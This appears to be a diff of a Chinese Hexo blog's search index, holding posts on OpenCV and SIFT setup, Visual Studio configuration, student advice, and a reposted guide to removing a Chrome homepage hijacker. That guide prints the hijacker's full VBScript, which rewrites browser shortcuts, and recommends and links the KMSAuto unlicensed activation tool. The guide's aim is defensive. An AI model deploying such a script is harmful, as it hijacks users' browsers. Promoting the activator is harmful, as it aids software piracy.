+<h3 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h3><p><code>menu</code> 下有多项设置可选，看需求设置就好。</p>
+<p>如需自定页面，还需按需添加翻译信息（文件位置 <code>languages/{language}.yml</code>）</p>
+<p>以上设置完成差不多就可以 deploy 了，其他细节慢慢添加。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 闲杂 </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Ubuntu 下安装 opencv-contrib 做 SIFT 特征匹配(Python)]]></title>
+      <url>http://yoursite.com/2018/06/05/Ubuntu-%E4%B8%8B%E5%AE%89%E8%A3%85-opencv-contrib-%E5%81%9A-SIFT-%E7%89%B9%E5%BE%81%E5%8C%B9%E9%85%8D-Python/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="Ubuntu-下安装-opencv-contrib-做-SIFT-特征匹配-Python"><a href="#Ubuntu-下安装-opencv-contrib-做-SIFT-特征匹配-Python" class="headerlink" title="Ubuntu 下安装 opencv-contrib 做 SIFT 特征匹配(Python)"></a>Ubuntu 下安装 opencv-contrib 做 SIFT 特征匹配(Python)</h1><p>因为 SIFT 算法的授权问题，导致 OpenCV 有两个版本，即如需使用 SIFT 算法就必须要用 OpenCV-contrib ，但是 VS2017 里配置 OpenCV-contrib 比较繁琐，在 Linux 下就会方便很多。</p>
+<p>本文所使用环境：</p>
+<ul>
+<li>Ubuntu 16.04 LTS</li>
+<li>Python 2.7</li>
+</ul>
+<h2 id="安装-opencv-contrib"><a href="#安装-opencv-contrib" class="headerlink" title="安装 opencv-contrib"></a>安装 opencv-contrib</h2><ul>
+<li><p>先安装 pip 软件包管理系统</p>
+<ul>
+<li><p>打开一个 Terminal (快捷键 <code>ctrl + alt + t</code> )</p>
+</li>
+<li><p>输入以下命令后回车，按提示操作</p>
+</li>
+</ul>
+<p><code>sudo apt-get install python-pip</code></p>
+</li>
+<li><p>安装 OpenCV-contrib</p>
+</li>
+</ul>
+<p>Terminal 中输入以下命令，等待提示完成即可</p>
+<p><code>pip install opencv-contrib-python</code></p>
+<ul>
+<li>验证</li>
+</ul>
+<p>Terminal 中执行以下命令验证是否安装成功</p>
+<p><code>$ python</code></p>
+<p><code>import cv2 as cv</code></p>
+<p><code>print(cv.__version__)</code></p>
+<p>安装成功会输出当前版本号</p>
+<h2 id="SIFT-特征匹配"><a href="#SIFT-特征匹配" class="headerlink" title="SIFT 特征匹配"></a>SIFT 特征匹配</h2><ul>
+<li><p>代码</p>
+<pre><code>#sift feature
+import cv2
+import numpy as np
+MIN_MATCH_COUNT = 4
+imgname1 = &quot;1.jpg&quot;
+imgname2 = &quot;2.jpg&quot;
+## (1) prepare data
+img1 = cv2.imread(imgname1)
+img2 = cv2.imread(imgname2)
+gray1 = cv2.cvtColor(img1, cv2.COLOR_BGR2GRAY)
+gray2 = cv2.cvtColor(img2, cv2.COLOR_BGR2GRAY)
+## (2) Create SIFT object
+sift = cv2.xfeatures2d.SIFT_create()
+## (3) Create flann matcher
+matcher = cv2.FlannBasedMatcher(dict(algorithm = 1, trees = 5), {})
+## (4) Detect keypoints and compute keypointer descriptors
+kpts1, descs1 = sift.detectAndCompute(gray1,None)
+kpts2, descs2 = sift.detectAndCompute(gray2,None)
+## (5) knnMatch to get Top2
+matches = matcher.knnMatch(descs1, descs2, 2)
+# Sort by their distance.
+matches = sorted(matches, key = lambda x:x[0].distance)
+## (6) Ratio test, to get good matches.
+good = [m1 for (m1, m2) in matches if m1.distance &amp;lt; 0.7 * m2.distance]
+canvas = img2.copy()
+## (7) find homography matrix
+if len(good)&amp;gt;MIN_MATCH_COUNT:
+    ## (queryIndex for the small object, trainIndex for the scene )
+    src_pts = np.float32([ kpts1[m.queryIdx].pt for m in good ]).reshape(-1,1,2)
+    dst_pts = np.float32([ kpts2[m.trainIdx].pt for m in good ]).reshape(-1,1,2)
+    ## find homography matrix in cv2.RANSAC using good match points
+    M, mask = cv2.findHomography(src_pts, dst_pts, cv2.RANSAC,5.0)
+    #matchesMask2 = mask.ravel().tolist()
+    h,w = img1.shape[:2]
+    pts = np.float32([ [0,0],[0,h-1],[w-1,h-1],[w-1,0] ]).reshape(-1,1,2)
+    dst = cv2.perspectiveTransform(pts,M)
+    cv2.polylines(canvas,[np.int32(dst)],True,(0,255,0),3, cv2.LINE_AA)
+else:
+    print( &quot;Not enough matches are found - {}/{}&quot;.format(len(good),MIN_MATCH_COUNT))
+## (8) drawMatches
+matched = cv2.drawMatches(img1,kpts1,canvas,kpts2,good,None)#,**draw_params)
+## (9) Crop the matched region from scene
+h,w = img1.shape[:2]
+pts = np.float32([ [0,0],[0,h-1],[w-1,h-1],[w-1,0] ]).reshape(-1,1,2)
+dst = cv2.perspectiveTransform(pts,M)
+perspectiveM = cv2.getPerspectiveTransform(np.float32(dst),pts)
+found = cv2.warpPerspective(img2,perspectiveM,(w,h))
+## (10) save and display
+cv2.imwrite(&quot;matched.png&quot;, matched)
+cv2.imwrite(&quot;found.png&quot;, found)
+cv2.imshow(&quot;matched&quot;, matched);
+#cv2.imshow(&quot;found&quot;, found);
+cv2.waitKey();cv2.destroyAllWindows()
+</code></pre></li>
+</ul>
+<p>原始图像：</p>
+<p><a href="https://miao.su/image/w8eD7" target="_blank" rel="noopener"><img src="https://miao.su/images/2018/05/02/1e043b.md.jpg" alt="1e043b.md.jpg"></a></p>
+<p><a href="https://miao.su/image/w83a5" target="_blank" rel="noopener"><img src="https://miao.su/images/2018/05/02/2c0118.md.jpg" alt="2c0118.md.jpg"></a></p>
+<p>匹配结果：</p>
+<p><img src="https://miao.su/images/2018/05/02/3346ac.jpg" alt="3346ac.jpg"></p>
+]]></content>
+      
+        <categories>
+            
+            <category> OpenCV </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[OpenCV 在 Visual Studio 中的使用]]></title>
+      <url>http://yoursite.com/2018/04/28/OpenCV-%E5%9C%A8-Visual-Studio-%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="OpenCV-在-Visual-Studio-2017-中的使用"><a href="#OpenCV-在-Visual-Studio-2017-中的使用" class="headerlink" title="OpenCV 在 Visual Studio 2017 中的使用"></a>OpenCV 在 Visual Studio 2017 中的使用</h1><p>因为 nonfree 的算法问题，重写部分内容，文中图片暂不更换，文件名及路径以文字为准。</p>
+<p>PS: 文中理论上没有错误的地方了=￣ω￣=</p>
+<p>因为某些原因，阅读体验较差</p>
+<p>本文内容：    </p>
+<ul>
+<li>OpenCV 的安装</li>
+<li>Visual Studio 的安装</li>
+<li>VS 中配置 OpenCV</li>
+</ul>
+<p>所需环境及文件（仅供参考）：    </p>
+<ul>
+<li>Windows 10 64 bit</li>
+<li>opencv-2.4.13.6-vc14.exe</li>
+<li>Visual Studio 2017</li>
+</ul>
+<p>推荐使用 <code>OpenCV-2.*</code> 是因为可以更方便使用如 SIFT 等 nonfree 算法</p>
+<h2 id="OpenCV-的安装"><a href="#OpenCV-的安装" class="headerlink" title="OpenCV 的安装"></a>OpenCV 的安装</h2><ol>
+<li>下载<br>在 OpenCV 的 GitHub 的 <a href="https://github.com/opencv/opencv/releases" target="_blank" rel="noopener">Releases</a> 页面下载 <code>opencv-2.4.13.6-vc14.exe</code> 文件 （<a href="https://www.opencv.org/releases.html" target="_blank" rel="noopener">OpenCV</a> 此页面也可下载到）</li>
+<li>安装<br>上述下载的文件为自解压文件，双击后选择要解压的目录即可（本文直接解压到 C 盘，后续用到的路径根据自己解压的路径自行替换）</li>
+<li>添加环境变量<br>右键此电脑 –&gt; 属性 –&gt; 高级系统设置 –&gt; 环境变量<br>编辑系统变量的 Path 变量，添加 <code>C:\opencv\build\x64\vc14\bin</code> 此路径</li>
+</ol>
+<h2 id="Visual-Studio-的安装"><a href="#Visual-Studio-的安装" class="headerlink" title="Visual Studio 的安装"></a>Visual Studio 的安装</h2><ol>
+<li>下载<br>进入官方<a href="https://www.visualstudio.com/zh-hans/downloads/" target="_blank" rel="noopener">下载</a>页面下载 Visual Studio Community 2017 版本 （确保你有微软账号，软件需要登陆，不登陆可能会有使用时间限制）</li>
+<li>安装<br>打开刚下载的软件，等待些许时间会进入 Visual Studio Installer , 选择 Visual Studio Community 2017 安装，接下来我们选择要安装的环境（本文选择 c++ ）如下图    (此处需要注意，C 盘务必保留充足空间，即使更换了安装位置还是要占用 C 盘部分空间)<br><img src="https://miao.su/images/2018/04/26/vs_install14beb.png" alt="vs_install14beb.png"></li>
+</ol>
+<p>接下来等待安装程序自动下载安装，时间长短依赖个人网速及电脑性能</p>
+<h2 id="VS-中配置-OpenCV"><a href="#VS-中配置-OpenCV" class="headerlink" title="VS 中配置 OpenCV"></a>VS 中配置 OpenCV</h2><p>大致需要三个步骤：</p>
+<ul>
+<li>编译器添加 include 路径</li>
+<li>编译器添加 lib 路径</li>
+<li>编译器添加 lib 文件</li>
+</ul>
+<ol>
+<li>新建一个空/控制台项目<br><img src="https://miao.su/images/2018/04/26/create8e7cd.png" alt="create8e7cd.png"></li>
+<li>添加一个源文件<br><img src="https://miao.su/images/2018/04/26/new_file20a5b.png" alt="new_file20a5b.png"><br><img src="https://miao.su/images/2018/04/26/new_file_2b4733.png" alt="new_file_2b4733.png"></li>
+<li>配置 OpenCV 并运行测试代码</li>
+</ol>
+<ul>
+<li>配置</li>
+</ul>
+<p>红框处按图片上设置然后在新建的项目上右键然后选择属性</p>
+<p><img src="https://miao.su/images/2018/04/27/setting47ecf.png" alt="setting47ecf.png"></p>
+<p>添加 <code>C:\opencv\build\include</code> 路径，注意红框处</p>
+<p><img src="https://miao.su/images/2018/04/27/set1c0bf0.png" alt="set1c0bf0.png"></p>
+<p>添加 <code>C:\opencv\build\x64\vc14\lib</code> 路径</p>
+<p><img src="https://miao.su/images/2018/04/27/set2fd47e.png" alt="set2fd47e.png"></p>
+<p>添加 <code>opencv_ml2413d.lib</code><br><code>opencv_calib3d2413d.lib</code><br><code>opencv_contrib2413d.lib</code><br><code>opencv_core2413d.lib</code><br><code>opencv_features2d2413d.lib</code><br><code>opencv_flann2413d.lib</code><br><code>opencv_gpu2413d.lib</code><br><code>opencv_highgui2413d.lib</code><br><code>opencv_imgproc2413d.lib</code><br><code>opencv_legacy2413d.lib</code><br><code>opencv_objdetect2413d.lib</code><br><code>opencv_ts2413d.lib</code><br><code>opencv_video2413d.lib</code><br><code>opencv_nonfree2413d.lib</code><br><code>opencv_ocl2413d.lib</code><br><code>opencv_photo2413d.lib</code><br><code>opencv_stitching2413d.lib</code><br><code>opencv_superres2413d.lib</code><br><code>opencv_videostab2413d.lib</code><br>这些库文件，Release mod 删除后缀前的 <code>d</code> 即可，其他版本根据具体版本修改每个文件中的数字（即版本号）</p>
+<p><img src="https://miao.su/images/2018/04/27/set3b23e4.png" alt="set3b23e4.png">    </p>
+<ul>
+<li>测试代码</li>
+</ul>
+<p>将代码 copy 到刚刚新建的源文件并保存</p>
+<pre><code>    /**********************************************************
+    Name :
+    Date : 2016/05/29
+    By   : CharlotteHonG
+    Final: 2016/05/29
+    **********************************************************/
+    #include &amp;lt;iostream&amp;gt;
+    #include &amp;lt;opencv2/opencv.hpp&amp;gt;
+
+    using namespace cv;
+
+    int main(int argc, char const *argv[]) {
+    /* 畫布 */
+    Mat img(270, 720, CV_8UC3, Scalar(56, 50, 38));
+    /* 直線 */
+    line(img, Point(20, 40), Point(120, 140), Scalar(255, 0, 0), 3);
+    /* 實心方塊 */
+    rectangle(img, Point(150, 40), Point(250, 140), Scalar(0, 0, 255), -1);
+    /* 實心圓 */
+    circle(img, Point(330, 90), 50, Scalar(0, 255, 0), -1);
+    /* 空心橢圓 */
+    ellipse(img, Point(460, 90), Size(60, 40), 45, 0, 360, Scalar(255, 255, 0), 2);
+    /* 不規則圖形 */
+    Point points[1][5];
+    int x = 40, y = 540;
+    points[0][0] = Point(0 + y, 50 + x);
+    points[0][1] = Point(40 + y, 0 + x);
+    points[0][2] = Point(110 + y, 35 + x);
+    points[0][3] = Point(74 + y, 76 + x);
+    points[0][4] = Point(28 + y, 96 + x);
+    const Point* ppt[1] = { points[0] };
+    int npt[] = { 5 };
+    polylines(img, ppt, npt, 1, 1, Scalar(0, 255, 255), 3);
+    /* 繪出文字 */
+    putText(img, &quot;Test Passed !!&quot;, Point(10, 230), 0, 3, Scalar(255, 170, 130), 3);
+    /* 開啟畫布 */
+    namedWindow(&quot;OpenCV Test By:Charlotte.HonG&quot;, WINDOW_AUTOSIZE);
+    imshow(&quot;OpenCV Test By:Charlotte.HonG&quot;, img);
+    waitKey(0);
+    return 0;
+}    
+</code></pre><p>一切准备好了，现在，直接按 F5 运行即可。不出意外，你会看到下图，如果出现问题，请检查以上步骤。</p>
+<p><img src="https://miao.su/images/2018/04/27/result90832.png" alt="result90832.png"></p>
+<hr>
+<p>关于 SIFT 算法的程序问题，新建项目时推荐新建 <code>Windows控制台应用程序</code> ，网上的程序可能会因为配置的 OpenCV 的路径不同，无法在你的电脑上运行（即找不到头文件），所以如果你使用本文的方法配置环境，对于 OpenCV 的扩展头文件应使用如下形式： <code>#include &quot;opencv2/highgui/highgui.hpp&quot;</code></p>
+<hr>
+<p>ps: 此方法在每次新建项目后都要重新配置，貌似是 vs2017 无法全局配置，可以尝试将配置导出，以后直接导入配置，应该会方便些，具体方法这里就不说了（或者其他的配置方式）。</p>
+<hr>
+<p>本文部分内容及代码借鉴自此博主 <a href="https://charlottehong.blogspot.tw/" target="_blank" rel="noopener">Charlotte.HonG</a> 的文章 <a href="https://charlottehong.blogspot.com/2017/06/opencv-320-vc14-visual-studio-2017.html?showComment=1524791827206#c7492050726078333196" target="_blank" rel="noopener">[圖文] OpenCV 3.4.1 安裝配置在 Visual Studio 2017</a> （感谢 <a href="https://charlottehong.blogspot.tw/" target="_blank" rel="noopener">Charlotte.HonG</a> ^_^）</p>
+]]></content>
+      
+        <categories>
+            
+            <category> OpenCV </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Chrome主页被篡改后如何解决？(部分内容转载)]]></title>
+      <url>http://yoursite.com/2018/01/22/Chrome%E4%B8%BB%E9%A1%B5%E8%A2%AB%E7%AF%A1%E6%94%B9%E5%90%8E%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><p>不少朋友可能都遇到过浏览器的主页被恶意篡改成某些令人作呕的国产网页，具体哪些网站，我想必也不必多说，大家也都心知肚明。</p>
+<p>篡改浏览器的主页有很多种途径，最常见的就是直接去修改应用程序的快捷方式的 Command line ，强制在默认代码后加入将被导向的流氓网址。用这种方法可以说是挺直接的，我们也最容易发现问题所在。下面转载一篇今天发现并用到的一篇文章，希望能够给您带来一些帮助。</p>
+<p>以下为原文：</p>
+<p><hr></p>
+<p></p><p>最近重装了一次电脑。尽管什么百度系的软件我都没有下载，Chrome浏览器的主页还是被硬生生劫持了。每次点开后的主页是<a href="https://link.zhihu.com/?target=http%3A//hao.qquu8.com" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">http://</span><span class="visible">hao.qquu8.com</span><span class="invisible"></span></a>这个链接，紧接着它会跳向hao123。电脑上原装的其他浏览器（IE和Edge）也是这样，弄得每次打开浏览器就被恶心一下，很是恼火。</p><p><br></p><p></p>
+<p><div align="center"><br><img src="https://pic1.zhimg.com/80/v2-caab8e64d2116cc4a155f646f8093218_hd.jpg" alt=""><br></div></p>
+<p></p><p><br></p><p>我们先来看看问题在哪。右键快捷方式查看属性：</p><p><br></p><p></p>
+<p><div align="center"><br><img src="https://pic1.zhimg.com/50/v2-e22306ce7f2f7559ff99a1a6489a324b_hd.jpg" alt=""><br></div></p>
+<p></p><p><br></p><p>哦，原来快捷方式被改了，后面加了一段url。把它删了试试？</p><p>还是不行，几分钟后还是被改回来了。</p><p>我在很多平台上找了解决办法。有的试了没有效果，重新开机后还是一样的毛病，有的推荐装“管家”，但这种以毒攻毒的办法无异于饮鸩止渴。最后终于有一种靠谱的方法，经过实验和一点修改，完美解决！</p><p>主页被劫持的原理是一段通过WMI发起的定时自动运行脚本，WMI（Windows Management Instrumentation）可以理解成Windows系统后台运行的一个事件管理器。为查看WMI事件，先去下载WMITools并安装：<a href="https://link.zhihu.com/?target=https%3A//arlenluo.github.io./images/post6/WMITools.exe" class=" wrap external" target="_blank" rel="nofollow noreferrer">WMI工具</a>。</p><p>之后打开WMI Event Viewer：</p><p><br></p> <p></p>
+<p><div align="center"><br><img src="https://pic2.zhimg.com/50/v2-3246c0019fcd49aa591733efb67a0e10_hd.jpg" alt=""><br></div></p>
+<p></p><p><br></p><p>点击左上角的笔的图标（Register For Events），在弹出的Connect to namespace的框直接点OK，Login的页面也直接点OK。点开左侧栏的EventFilter，再点击下级目录的项目：</p><p><br></p><div align="center"><br><img src="https://pic1.zhimg.com/50/v2-4f424c287c30e2a2ef31acc14043c1c9_hd.jpg" alt=""><br></div><p></p>
+<p></p><p><br></p><p>在右侧栏右键点击ActiveScriptEventConsumer，并通过view instant properties查看属性：</p><p><br></p><p></p>
+<p><div align="center"><br><img src="https://pic7.zhimg.com/50/v2-d6376daf291d17833f10b6976246af9b_hd.jpg" alt=""><br></div></p>
+<p></p><p><br></p><p>在Script Text那一栏我们可以看到这段脚本：</p><div class="highlight"><pre><code class="language-text"><span></span>On Error Resume Next<p></p>
+<p>Const link = “<a href="http://hao.qquu8.com/?m=yx&amp;amp;r=j" target="_blank" rel="noopener">http://hao.qquu8.com/?m=yx&amp;amp;r=j</a>“<br>Const link360 = “<a href="http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3" target="_blank" rel="noopener">http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3</a>“<br>browsers = “114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe”<br>lnkpaths = “C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start Menu\Programs,C:\Users\sjtul\Desktop,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar,C:\Users\sjtul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs”<br>browsersArr = split(browsers,”,”)<br>Set oDic = CreateObject(“scripting.dictionary”)<br>For Each browser In browsersArr<br>​    oDic.Add LCase(browser), browser<br>Next<br>lnkpathsArr = split(lnkpaths,”,”)<br>Set oFolders = CreateObject(“scripting.dictionary”)<br>For Each lnkpath In lnkpathsArr<br>​    oFolders.Add lnkpath, lnkpath<br>Next<br>Set fso = CreateObject(“Scripting.Filesystemobject”)<br>Set WshShell = CreateObject(“Wscript.Shell”)<br>For Each oFolder In oFolders<br>​    If fso.FolderExists(oFolder) Then<br>​        For Each file In fso.GetFolder(oFolder).Files<br>​            If LCase(fso.GetExtensionName(file.Path)) = “lnk” Then<br>​                Set oShellLink = WshShell.CreateShortcut(file.Path)<br>​                path = oShellLink.TargetPath<br>​                name = fso.GetBaseName(path) &amp; “.” &amp; fso.GetExtensionName(path)<br>​                If oDic.Exists(LCase(name)) Then<br>​                    If LCase(name) = LCase(“360se.exe”) Then<br>​                        oDicShellLink.Arguments = link360<br>​                    Else<br>​                        oShellLink.Arguments = link<br>​                    End If<br>​                    If file.Attributes And 1 Then<br>​                        fsoile.Attributes = file.Attributes - 1<br>​                    End If<br>​                    oShellLink.Save<br>​                End If<br>​            End If<br>​        Next<br>​    End If<br>Next<br></p></code></pre></div><p>终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。</p><p>查到了源头如何清清除这段造孽的脚本呢？直接在WMI Event Viewer中将_EventFilter.Name=”VBScriptKids_filter”右键删掉会被系统拒绝掉，需要去WMI Event Viewer的安装位置，右键以管理员方式运行exe文件才能删掉。之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。唉，一趟下来真是让人心累，好在最终浏览器摆脱了流氓网站的劫持：</p><p><br></p><div align="center"><br><img src="https://pic2.zhimg.com/50/v2-a571e709fb0cb04219e7f25489fd2272_hd.jpg" alt=""><br></div><p></p>
+<p></p><p><br></p><p>当然在这时候，你可以点击之前下载的WMI安装包，把WMI系列工具卸载掉。</p><p>最后提一下电脑中毒的原因。我分析是前几天用了小马激活这个工具来激活Windows系统，当时并没有激活成功反而还引来了病毒。推荐一款<a href="https://link.zhihu.com/?target=https%3A//myfreeproject.com/soft/81-kmsauto-net-2016.html" class=" wrap external" target="_blank" rel="nofollow noreferrer">俄罗斯人开发的工具</a>，可以成功激活Windows系统和Office软件，也不会招来一些流氓脚本：<a href="https://link.zhihu.com/?target=https%3A//arlenluo.github.io./images/post6/KMSAuto-Net-1.4.9.zip" class=" wrap external" target="_blank" rel="nofollow noreferrer">KMSAuto</a></p><p>详见<a href="https://link.zhihu.com/?target=https%3A//jing-luo.github.io/2017/03/DefeatYourBrowser/" class=" wrap external" target="_blank" rel="nofollow noreferrer">抢救被流氓网站劫持的浏览器主页</a></p><hr><p></p>
+<p>注：</p>
+<p>转载自知乎</p>
+<p>原作者： <a href="https://www.zhihu.com/people/a_huang/activities" target="_blank" rel="noopener">七个太阳</a></p>
+<p>原文链接： <a href="https://www.zhihu.com/question/21883209/answer/151221887" target="_blank" rel="noopener">为什么 Chrome 浏览器的主页会被篡改为 hao123 ？遇到这种情况要如何修复？ 七个太阳的回答</a></p>
+<p>转载以经作者授权，如需二次转载，请务必联系原作者，在此感谢原作者的文章及授权。</p>
+<hr>]]></content>
+      
+        <categories>
+            
+            <category> Tips </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[见字如面第二季第一期]]></title>
+      <url>http://yoursite.com/2017/09/23/jianzirumian-2-1-1506163849669/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><iframe width="854" height="480" src="https://www.youtube.com/embed/1gPBebVsCkk?list=PLm_0Lz4oq9aT7_Z691UUJaqyoHR9xaxSh" frameborder="0" allowfullscreen></iframe>]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Ludus]]></title>
+      <url>http://yoursite.com/2017/06/26/Ludus/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><p>大约一个月前从一个视频中知道了<a href="https://app.ludus.one" target="_blank" rel="noopener">Ludus</a>这个网站，很惊艳，想立即体验一下，无奈没有权限，今天收到<a href="https://app.ludus.one" target="_blank" rel="noopener">Ludus</a>的邮件,给了personal invite code，马上就体验了一波，真的实用又美观。想想当你去做演讲什么的，不用再带着U盘去展示生硬的PPT，而是直接在浏览器中输入链接，就可以将远比PPT美观的作品展示给大家，是不是很高大上啊。</p>
+<p>下面是刚刚弄得一个非常简单的作品，大家轻喷。</p>
+<div style="position:relative;padding-bottom:56.25%;height:0;overflow:hidden;max-width:100%;"><iframe src="https://app.ludus.one/419ac98c-e972-40c1-a710-f07166645acb" frameborder="0" allowfullscreen style="position:absolute;top:0;left:0;width:100%;height:100%;"></iframe></div>]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[给大学生的几条良心建议（转载）]]></title>
+      <url>http://yoursite.com/2017/05/19/%E7%BB%99%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%9A%84%E5%87%A0%E6%9D%A1%E8%89%AF%E5%BF%83%E5%BB%BA%E8%AE%AE%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h4 id="原文-by-stormzhang"><a href="#原文-by-stormzhang" class="headerlink" title="原文    by:stormzhang"></a>原文    by:<a href="http://stormzhang.com" target="_blank" rel="noopener">stormzhang</a></h4><p>这篇文章是我写给小密圈中 20% 比例的大学生的，但是考虑到我公众号的读者中也有不少也是大学生或者研究生，所以姑且分享出来，希望对更多的还在校园的同学有所帮助与思考，更希望能够消除你们对未来的迷茫与恐慌。</p>
+<ol>
+<li>绝大部分的大学教育都是渣</li>
+</ol>
+<p>可能有人觉得话说的有点难听，但是事实就是如此，这不是大学的问题，本质上是中国教育的问题，中国的教育一向都是「灌输式」教学，成绩差跟成绩好的同学唯一的区别就是，成绩好的会很努力的去记那些理论性的东西，会非常在意自己的分数与奖项，成绩差的同学则比较懒，但不是笨，甚至很多人比成绩好的同学要聪明，但是本质上，他们都清一色的不知道自己所学的那些东西到底有什么用？这个才是最可悲的地方。</p>
+<p>所以，如果你在学校的成绩比较好，那么别骄傲，你只不过会是在毕业后的应聘简历上多一条「大学奖学金获得者」而已，其他没什么特别大的优势，成绩差的也别灰心，你只是比较懒，不愿让自己的付出回报不成正比而已。那些学校好的与学校差的同学，也只是在学历上的一点优势而已，中国绝大部分的学校教育都缺乏讨论、缺乏思考、缺乏实践。</p>
+<p>当然，名校肯定比一般的学校要好，这个毋庸置疑，而且平均水平肯定是名校比一般学校出来的人才更多，但是也只是平均而已，我跟比尔盖茨平均起来，我也是亿万富翁了，根本还是取决于个人。</p>
+<ol>
+<li>你现在的专业跟你以后的工作可能没什么关系</li>
+</ol>
+<p>很多毕业生毕业总是奢求能找到一份专业对口的工作，我告诉你，这很难，本质上也是因为中国的教育造成的，前面说到，你在学校学到的东西根本不知道以后干嘛用的。</p>
+<p>拿计算机专业的举例，正是因为计算机专业的同学大学学了一堆什么计算机网络、操作系统，C 语言、数据结构等等，都是最最枯燥、最最乏味的课程，你学了四年，你从来不知道这些东西能做什么用？导致很多计算机专业的同学对自己的课程很厌恶，甚至到了抵触的心理，这也直接造成很多计算机专业的同学毕业后有很多去做了销售，等你工作后才发现，反而工作中从事编程行业的，却很多不是计算机专业的，有很多都是其他理科类专业的同学，而且这部分人大部分是因为毕业后工作接触到了编程，对此产生兴趣，知道这个能赚钱，所以发奋自学，从而走上了这一行。</p>
+<p>所以，不管你是什么专业的，如果对本专业感兴趣，那还好，毕业之后尽量去找个专业相关的工作，如果对本专业不感兴趣，想从事别的行业，别担心，只要你感兴趣，肯用心去学习，那么一定不是问题，有时候甚至比那些科班生出身更有优势，因为这个职业是你自己出于兴趣以及回报而选择的，没有任何人逼你，你会更有动力去学习。</p>
+<ol>
+<li>「学习能力」是大学四年学到的最重要技能</li>
+</ol>
+<p>前面虽然把大学说的一无是处，有人会问，那干脆别读大学好了，这当然是不行的。虽然中国的大学教育有它各种各样的问题，但是这个时代，首先大学文凭是一个硬性规定，没有大学学历，你是很难在社会上立足的，起点会非常难。其次，大学跟高中的形式有着本质的区别，高中的教育是家长和老师的驱动下，面对种种压力你不得不去学习，所以高中的学习是压力下不得不去做的事。</p>
+<p>但是大学可就不一样了，没人看着你，没人会关注到你，你有更多的自由与选择空间，玩什么，结实什么样的人，去不去上课都完全取决于你，我相信绝大部分大学生的考试复习大都集中在考试前的最后两周，这种学习完全是自我驱动的，所以，大学还是非常有必要上的，而且每个人最主要的区别可能就体现在了「学习能力」上，因为你会发现，大家都是上着同样的课，甚至有的人根本不去听课，但是同样是最后两周的自学冲刺，有的人就能轻松考过，或者考了很高的分数，有的人却学了很久依然考的不理想，这就是学习能力的差异。</p>
+<p>即使是玩游戏，同样的时间，有的人玩的很好，会分析怎么出装更合理，团队战术怎么更容易取胜，有的人，却是一直沉迷于游戏，自制力很弱，而且还很有可能玩的不行。</p>
+<p>所以，自制力很好，学习能力很不错的人，会在以后的职场有更多、更好的选择，而且也容易有更好的发展，即使这个人在大学喜欢玩游戏，即使在大学成绩很一般。</p>
+<ol>
+<li>多动手，多实习</li>
+</ol>
+<p>前面说了，大学学的都是一些理论性的东西，你根本不知道那些东西能干嘛，但是如果你能尽早去实习，尽早去参与实践，那你会有别样的体会。</p>
+<p>举个例子，当计算机专业的同学都不知道所学的理论能干嘛的时候，你就去一家企业实习了，即使平时的工作只是打杂，但是你能真正认识了实际工作中是怎样的，别人在工作的时候用到了什么技能，看到别人拿到的高薪，你会发现原来，你所学的那些东西这么值钱，你会更有动力去学习，而且很有针对性的去学习，你得相信，理论与实践相结合，比那些只会闷头读书的人要有用的多，你想要的不是只在学校里空虚的考试分数而已，你更想要的是未来用自己的技能换取财富的能力！</p>
+<ol>
+<li>这些事情你该在大学就做了</li>
+</ol>
